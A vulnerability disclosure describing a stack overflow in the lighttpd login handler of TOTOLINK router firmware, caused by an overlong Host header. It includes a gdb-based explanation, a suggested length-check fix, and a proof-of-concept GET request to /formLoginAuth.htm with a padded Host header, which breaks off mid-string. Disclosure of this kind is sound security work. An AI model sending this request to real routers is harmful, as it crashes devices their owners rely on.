## Vulnerability description

We found an stack overflow vulnerability  in TOTOLINK Technology router with firmware which was released recently, allows remote attackers to crash the server.

**Stack Overflow**

In `lighttpd` binary:

In `Form_Login` function, `Host` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow,so we can control the `Host` to crash the server.

<div  align="center"><img src="./images/1.png" style="zoom:80%;" /></div>

Through the dynamic debugging of gdb, as you can see here, the parameter(a1+272) points to the content of the Host. It will cause the function return address to be overwritten.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>

**Supplement**

**This type of buffer overflow appears in various places in the lighttpd file.(Host: ........)**

In order to avoid such problems, we believe that the string content should be checked in the input extraction part. For example, you can limit the length of this field.



## PoC

We set `Host` as **aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa......** , then sending GET request such as:

```http
GET /formLoginAuth.htm?action=login&flag=1 HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
